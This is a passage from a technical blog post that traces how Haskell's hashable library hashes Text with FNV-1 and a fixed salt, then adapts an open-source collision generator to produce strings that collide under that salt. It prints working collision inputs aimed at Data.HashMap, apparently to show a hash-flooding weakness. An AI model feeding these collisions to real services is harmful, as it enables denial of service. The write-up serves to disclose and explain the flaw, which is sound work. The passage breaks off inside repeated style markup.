<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="pp">#if WORD_SIZE_IN_BITS == 64</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>defaultSalt <span class="ot">=</span> <span class="op">-</span><span class="dv">2578643520546668380</span>  <span class="co">-- 0xdc36d1615b7400a4</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="pp">#else</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a>defaultSalt <span class="ot">=</span> <span class="bn">0x087fc72c</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span></code></pre></div></div><p>In the case of <a href="https://github.com/bos/aeson/blob/master/Data/Aeson/Types/Internal.hs#L338-L351"><code>Data.Aeson.Value</code></a>, the type parameter <code>a</code> will be <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a>. If we look at the implementation of <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L631-L634"><code>Data.Hashable.Hashable Data.Text.Text</code></a>, we see that <code>hash</code> is not overridden:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="kw">instance</span> <span class="dt">Hashable</span> <span class="dt">T.Text</span> <span class="kw">where</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a>    hashWithSalt salt (<span class="dt">T.Text</span> arr off len) <span class="ot">=</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>        hashByteArrayWithSalt (TA.aBA arr) (off <span class="ot">`shiftL`</span> <span class="dv">1</span>) (len <span class="ot">`shiftL`</span> <span class="dv">1</span>)</span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>        salt</span></code></pre></div></div><p>This function uses <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L739-L756"><code>Data.Hashable.hashByteArrayWithSalt</code></a>, which directly calls out to a C function over the FFI:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="co">-- | Compute a hash value for the content of this &#39;ByteArray#&#39;, using</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="co">-- an initial salt.</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="co">--</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a><span class="co">-- This function can for example be used to hash non-contiguous</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="co">-- segments of memory as if they were one contiguous segment, by using</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a><span class="co">-- the output of one hash as the salt for the next.</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a>hashByteArrayWithSalt</span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a><span class="ot">    ::</span> <span class="dt">ByteArray</span><span class="op">#</span>  <span class="co">-- ^ data to hash</span></span>
<span id="9"><a href="#9" aria-hidden="true" tabindex="-1"></a>    <span class="ot">-&gt;</span> <span class="dt">Int</span>         <span class="co">-- ^ offset, in bytes</span></span>
<span id="10"><a href="#10" aria-hidden="true" tabindex="-1"></a>    <span class="ot">-&gt;</span> <span class="dt">Int</span>         <span class="co">-- ^ length, in bytes</span></span>
<span id="11"><a href="#11" aria-hidden="true" tabindex="-1"></a>    <span class="ot">-&gt;</span> <span class="dt">Int</span>         <span class="co">-- ^ salt</span></span>
<span id="12"><a href="#12" aria-hidden="true" tabindex="-1"></a>    <span class="ot">-&gt;</span> <span class="dt">Int</span>         <span class="co">-- ^ hash value</span></span>
<span id="13"><a href="#13" aria-hidden="true" tabindex="-1"></a>hashByteArrayWithSalt ba <span class="op">!</span>off <span class="op">!</span>len <span class="op">!</span>h <span class="ot">=</span></span>
<span id="14"><a href="#14" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fromIntegral</span> <span class="op">$</span> c_hashByteArray ba (<span class="fu">fromIntegral</span> off) (<span class="fu">fromIntegral</span> len)</span>
<span id="15"><a href="#15" aria-hidden="true" tabindex="-1"></a>    (<span class="fu">fromIntegral</span> h)</span>
<span id="16"><a href="#16" aria-hidden="true" tabindex="-1"></a></span>
<span id="17"><a href="#17" aria-hidden="true" tabindex="-1"></a>foreign <span class="kw">import</span> ccall unsafe &quot;hashable_fnv_hash_offset&quot; c_hashByteArray</span>
<span id="18"><a href="#18" aria-hidden="true" tabindex="-1"></a><span class="ot">    ::</span> <span class="dt">ByteArray</span><span class="op">#</span> <span class="ot">-&gt;</span> <span class="dt">CLong</span> <span class="ot">-&gt;</span> <span class="dt">CLong</span> <span class="ot">-&gt;</span> <span class="dt">CLong</span> <span class="ot">-&gt;</span> <span class="dt">CLong</span></span></code></pre></div></div><p>Now let&#39;s have a look at this C code. It can be found in the <a href="https://github.com/tibbe/hashable/tree/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0">hashable</a> repository in <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c"><code>cbits/fnv.c</code></a>.</p><p>The relevant functions are called <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c#L49-L54"><code>hashable_fnv_hash_offset</code></a> and <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c#L34-L47"><code>hashable_fnv_hash</code></a>. Specifically, we are interested in <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c#L39-L47">this snippet</a>:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="co">/* FNV-1 hash</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="co"> *</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="co"> * The FNV-1 hash description: http://isthe.com/chongo/tech/comp/fnv/</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a><span class="co"> * The FNV-1 hash is public domain: http://isthe.com/chongo/tech/comp/fnv/#public_domain</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a><span class="dt">long</span> hashable_fnv_hash<span class="op">(</span><span class="dt">const</span> <span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*</span> str<span class="op">,</span> <span class="dt">long</span> len<span class="op">,</span> <span class="dt">long</span> salt<span class="op">)</span> <span class="op">{</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a></span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">unsigned</span> <span class="dt">long</span> hash <span class="op">=</span> salt<span class="op">;</span></span>
<span id="9"><a href="#9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span>len<span class="op">--)</span> <span class="op">{</span></span>
<span id="10"><a href="#10" aria-hidden="true" tabindex="-1"></a>    hash <span class="op">=</span> <span class="op">(</span>hash <span class="op">*</span> <span class="dv">16777619</span><span class="op">)</span> <span class="op">^</span> <span class="op">*</span>str<span class="op">++;</span></span>
<span id="11"><a href="#11" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="12"><a href="#12" aria-hidden="true" tabindex="-1"></a></span>
<span id="13"><a href="#13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> hash<span class="op">;</span></span>
<span id="14"><a href="#14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div></div><p>What happens here is that a state variable <code>hash</code> is initialised to the given salt: <code>salt</code>. For every byte in the array, the state is multiplied by a constant (<code>16777619</code>) and then XOR-ed with the next character in the bytestring. We will call this constant &quot;P&quot;. <a href="http://isthe.com/chongo/tech/comp/fnv/">It is called the <code>FNV_prime</code> in the spec.</a></p><p>Now, we know that <code>FNV</code> is not a collision-resistant hash, so this is where the hunt for collisions starts.</p><h3>Hunt for collisions</h3><p>Finding collisions of the <code>FNV</code> hash function has been done before. We found <a href="https://medium.com/@robertgrosse/generating-64-bit-hash-collisions-to-dos-python-5b21404a5306">a blogpost</a> that does exactly this. The blogpost is an interesting read, and I do recommend that you read it, but you can skip it on the first reading of this story. We will pick out the important bits. The important bits are:</p><ul><li><p>This is not a brute-force attack.</p></li><li><p>The code to find the collisions is open-source and is available <a href="https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b">on GitHub</a>.</p></li><li><p><a href="https://medium.com/@whosekiteneverfly/thanks-for-the-source-code-cc0d0cac2184">Someone commented that they were trying to attack hashable as well.</a></p></li></ul><p>We took the code from GitHub, and tried it out. We changed <a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L386">the constant that represents the length of the strings to find</a> to something more managable like <code>let n = 19</code> so that we could try running this quickly.</p><pre>$ nice -n 19 cargo run --release
</pre><p>We found two collisions:</p><pre>2580186283733862101
5578306458939803311
</pre><p>Note that these are strings of ascii characters that happen to represent numbers. They are not numbers. The specific character alphabet of [0-9] was chosen for reasons explained in the <a href="https://medium.com/@robertgrosse/generating-64-bit-hash-collisions-to-dos-python-5b21404a5306">blogpost</a>.</p><p>Also note that these are collisions for a different hash function.</p><p>To make sure that <a href="(https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b)"><code>fnv-collider</code></a> would find collisions for the hashable hash function, we would have to modify its code a bit.</p><h3>The prime</h3><p>The Rust code in the <a href="https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b">fnv-collider</a> contains a different prime than the prime that <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c#L39-L47">hashable</a> uses.</p><p>It uses <a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L34"><code>1000003</code></a>, so we changed that to <code>16777619</code>.</p><h3>The inverse of the prime</h3><p><a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L35">The next line mentions a constant called <code>PINV</code></a>. <a href="https://medium.com/@whosekiteneverfly/thanks-for-the-source-code-cc0d0cac2184">The previously mentioned comment</a> asks about this constant, and <a href="https://medium.com/@robertgrosse/pinv-is-simply-the-modular-inverse-of-p-the-multiplicative-constant-used-in-pythons-fnv-a4a4855ba5">the author responded that this was the multiplicative inverse of P</a>. That was really helpful. We calculated the modular multiplicative inverse of <code>16777619</code> module 2^64 and set the <a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L35"><code>PINV</code></a> constant to that value (<code>9778875398352553115</code>).</p><h4>Collisions for hashable</h4><p>Running <a href="https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b">fnv-collider</a> again, gave us two collisions:</p><pre>934220964271872523861
816508419940217090001
</pre><p>We tried them out on the C code in a somewhat convoluted way. We added a <code>main</code> function to the bottom of <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c">cbits/fnv.c</a>:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main <span class="op">()</span> <span class="op">{</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;934220964271872523861&quot;</span><span class="op">,</span> <span class="dv">21</span><span class="op">,</span> <span class="dv">0</span><span class="op">));</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;816508419940217090001&quot;</span><span class="op">,</span> <span class="dv">21</span><span class="op">,</span> <span class="dv">0</span><span class="op">));</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div></div><p>When we compiled it and ran it, we saw that these two strings do indeed collide:</p><pre>$ gcc fnv.c
$ ./a.out
0x0
0x0
</pre><p>Note that the last argument to <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/cbits/fnv.c#L34-L47"><code>hashable_fnv_hash</code></a> is the salt, and is set to <code>0</code>. The collisions that are being generated by <a href="(https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b)"><code>fnv-collider</code></a> are collisions only when <code>0</code> is used as the salt.</p><p>Using <a href="(https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b)"><code>fnv-collider</code></a> like this would not get us collisions that we would be able to attack <a href="https://github.com/tibbe/unordered-containers/blob/efa43a2ab09dc6eb72893d12676a8e188cb4ca63/Data/HashMap/Base.hs#L177-L185"><code>Data.HashMap.Strict.HashMap</code></a> with, because it uses <a href="https://github.com/tibbe/hashable/blob/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0/Data/Hashable/Class.hs#L192-L199"><code>0xdc36d1615b7400a4</code></a> as the salt.</p><h4>The starting state</h4><p>We had to change the collision generator again. This time, it was the starting state that we had to change. Specifically, the variable <a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L404"><code>i</code></a> which was set to <code>0</code> in <a href="https://github.com/Storyyeller/fnv-collider/blob/10fd4d28abe7fb6c5428df8fe309dbfb0094530b/collision_generator/src/main.rs#L402">a weird loop</a>. We changed that line to the following:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> i <span class="op">=</span> <span class="dv">0xdc36d1615b7400a4</span><span class="op">;</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>  [<span class="op">...</span>]</span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div></div><h4>Collisions for the hashable hash function</h4><p>We ran <a href="(https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b)"><code>fnv-collider</code></a> again with <code>let n = 20</code> and found the following collisions:</p><pre>48321104917634386617
66392526131448240459
17280429445395521746
79135381957515260764
44554690860062237799
79612854652076048686
</pre><p>We tried out these collisions in the C code:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
